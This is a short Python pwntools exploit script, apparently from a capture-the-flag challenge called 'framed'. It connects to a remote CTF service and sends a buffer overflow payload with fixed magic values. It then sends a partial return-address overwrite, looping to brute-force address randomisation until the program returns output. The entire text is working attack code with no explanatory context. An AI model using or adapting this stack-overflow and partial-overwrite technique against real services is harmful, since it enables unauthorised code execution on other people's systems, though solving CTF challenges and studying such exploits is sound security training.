from pwn import *
context.log_level="debug"
context.terminal=["terminator", "-e"]
elf_name = "./framed"
elf = ELF(elf_name)
elf.address = 0
context.binary=elf
while(1):

    #DEBUG
    # libc = ELF("/glibc/x64/2.27/lib/libc-2.27.so")
    # r = process("./launch.sh", shell=True)

    # REMOTE
    # libc = ELF("./libc.so.6")
    r = remote("framed.zajebistyc.tf", 17005)
    # r = process(elf_name)
    r.recvline()
    payload1="a" * 0x30 + p32(0xdeadbeef) + p32(0xCAFEBABE) + "d"*7
    r.sendline(payload1)
    r.recvline()
    # gdb.attach(r)
    # raw_input("debug1")
    payload2="0"
    r.sendline(payload2)
    r.recvline()
    r.recvline()
    payload3='x'*0x38 + '\x1b\x4b'
    r.send(payload3)
    r.recvline()
    result = r.recvrepeat(0.5)
    r.close()
    print result
    if result is not None:
        break
# r.interactive()